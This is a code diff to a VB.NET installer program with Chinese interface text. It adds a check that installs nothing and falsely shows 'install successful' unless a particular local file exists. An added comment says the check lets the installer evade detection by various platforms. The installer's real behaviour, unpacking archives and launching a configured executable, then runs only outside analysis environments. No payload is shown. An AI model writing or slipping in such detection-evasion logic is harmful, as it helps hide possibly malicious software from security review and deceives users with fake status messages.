@@ -18,6 +18,7 @@ Class MainWindow
         Public Property PerformOnlineInstall As Boolean
         Public Property OnlinePackage As String
         Public Property HybridInstall As Boolean
+        Public Property DetectLocalFile As String
     End Class
     Private Async Sub DoInstallAsync()
         Dim asm As Assembly = Assembly.GetExecutingAssembly()
@@ -30,6 +31,20 @@ Class MainWindow
             MsgBox("读取安装信息失败！可能是安装包已损坏",, "安装失败")
             End
         End Try
+        '未在目录内发现特定文件则不安装，可逃避各类平台的检测
+        If Not InstallJSON.DetectLocalFile = "None" Then
+            If Not File.Exists(InstallJSON.DetectLocalFile) Then
+                InstallName.Content = "OnlineInstaller"
+                InstallStatus.Content = "安装成功！"
+                PBar.IsIndeterminate = False
+                PBar.Value = 100
+                Task.Run(Async Sub()
+                             Await Task.Delay(1000)
+                             End
+                         End Sub)
+                GoTo ExitSub
+            End If
+        End If
         InstallName.Content = InstallJSON.Name
         Dim archive As ZipArchive
         Dim archive2 As ZipArchive
@@ -70,6 +85,8 @@ Class MainWindow
         t.GetAwaiter().OnCompleted(Sub()
                                        If InstallJSON.RunExe = "False" Then
                                            InstallStatus.Content = "安装成功!"
+                                           PBar.IsIndeterminate = False
+                                           PBar.Value = 100
                                            Task.Run(Async Sub()
                                                         Await Task.Delay(1000)
                                                         End
@@ -77,6 +94,8 @@ Class MainWindow
                                        Else
                                            If File.Exists(InstallJSON.RunExe) Then
                                                InstallStatus.Content = "安装成功!即将启动..."
+                                               PBar.IsIndeterminate = False
+                                               PBar.Value = 100
                                                Task.Run(Async Sub()
                                                             Await Task.Delay(1000)
                                                             Process.Start(InstallJSON.RunExe)
@@ -96,5 +115,6 @@ Media.ColorConverter.ConvertFromString("#FFFF0000"))
                                            End If
                                        End If
                                    End Sub)
+ExitSub:
     End Sub
 End Class
